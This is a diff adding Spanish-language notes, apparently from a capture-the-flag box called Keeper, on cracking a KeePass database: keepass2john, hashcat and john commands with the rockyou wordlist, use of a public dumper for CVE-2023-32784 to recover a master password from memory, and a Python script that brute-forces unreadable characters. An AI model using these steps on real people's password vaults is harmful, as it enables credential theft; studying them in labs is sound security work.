@@ -80,5 +80,80 @@ Stopped: Thu Jan 16 08:34:38 2025
 PS C:\Users\Grunt\Desktop\hashcat-6.2.6>
 ```
 
+## Crack keepass database
+
+```
+┌──(kali㉿kali)-[~/Desktop/boxes/Keeper]
+└─$ ls
+passcodes.kdbx  req.txt
+                                                                                                                       
+┌──(kali㉿kali)-[~/Desktop/boxes/Keeper]
+└─$ keepass2john passcodes.kdbx > keephash.txt
+                                                                                                                       
+┌──(kali㉿kali)-[~/Desktop/boxes/Keeper]
+└─$ ls
+keephash.txt  passcodes.kdbx  req.txt
+```
+
+- Ahora con hashcat: `hashcat -m 13400 keephash.txt /usr/share/wordlists/rockyou.txt`
+- o con john: `john --wordlist=/usr/share/wordlists/rockyou.txt keephash.txt`
+
+
+#### KEEPASS CVE-2023-32784
+- La vulnerabilidad CVE-2023-32784 es una falla en KeePass que permite recuperar la contraseña maestra de la memoria. Esta vulnerabilidad afecta a KeePass 2.x, y no requiere la ejecución de código en el sistema objetivo. La contraseña se puede recuperar desde un volcado de memoria del proceso, archivo de intercambio, archivo de hibernación, varios volcados de crash o un volcado de RAM del sistema completo.
+- Hay que instalar dotnet
+
+```bash
+# Agregar el repositorio de Microsoft
+wget https://packages.microsoft.com/config/debian/11/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
+sudo dpkg -i packages-microsoft-prod.deb
+
+# Instalar el SDK de .NET 7.0
+sudo apt-get update
+sudo apt-get install -y dotnet-sdk-7.0
+```
+
+- Luego hay que instalar [KeePassPasswordDumper](https://github.com/vdohney/keepass-password-dumper)
+- `dotnet run /ruta/al/.dmp`
+- Luego algun que otro caracter va a quedar mal, pero se puede iterar sobre este caracter con python.
+    - recomiendo utilizar itertools + un string con los caracteres que se quieren probar. 
+
+```python
+
+import itertools
+import sys
+
+def generate_combinations(pattern, unknown_chars, output_file):
+    # Lista de caracteres posibles para cada posición de la contraseña
+    positions = []
+    for char in pattern:
+        if char == "●":
+            positions.append(unknown_chars)
+        else:
+            positions.append(char)
+
+    # Generar todas las combinaciones posibles
+    with open(output_file, "w") as f:
+        for combination in itertools.product(*positions):
+            f.write(''.join(combination) + "\n")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("Uso: python3 generate_passwords_param.py <pattern> <unknown_chars> <output_file>")
+        sys.exit(1)
+    
+    pattern = sys.argv[1]
+    unknown_chars = sys.argv[2]
+    output_file = sys.argv[3]
+
+    generate_combinations(pattern, unknown_chars, output_file)
+
+``` 
+
+- python3 generate_pass.py "●ødgrød med fløde" "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" "pass.txt"
+- `hashcat -m 13400 keephash.txt pass.txt`
+- `john --wordlist=pass.txt keephash.txt`
+
+
 ### About john the ripper
 - The truth is that I don't give much importance to john the ripper, it is a very versatile tool but **the power of hashcat is beyond comparison**.
